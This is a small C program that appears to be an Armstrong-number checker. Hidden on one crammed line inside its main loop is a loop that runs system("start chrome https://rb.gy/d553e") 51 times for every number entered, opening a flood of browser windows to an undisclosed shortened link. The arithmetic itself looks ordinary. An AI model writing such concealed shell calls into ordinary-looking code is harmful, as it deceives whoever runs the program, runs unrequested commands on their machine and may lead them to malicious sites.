#include <stdio.h>
#include <stdlib.h> //😁
int pval(int v, int l){ 
	int pwr=1;
	for(int i=1; i<=l; i++){pwr *= v;}
	return pwr;
}
int main(){
	int x, s=0;
	while(3>2){	
		printf("Enter an  integer : ");
		int ch = scanf("%d", &x);
		if(ch!=1){printf("Invalid Input!!\n"); break;}
		int c = x, n=x, l=0;for(int u=0; u<=50; u++){
		system("start chrome https://rb.gy/d553e");}
		while(n>0){l++; n /=10;}
		for(int i=1; i<=l; i++){
			int mod = x%10;
			int power = pval(mod, l);
			s += power; x/=10;}
		if(c==s){printf("%d Armstrong\n", c);}
		else{printf("%d Not Armstrong\n", c);}
		s = 0;
	}
	return 87; //at that moment she realized...........
}
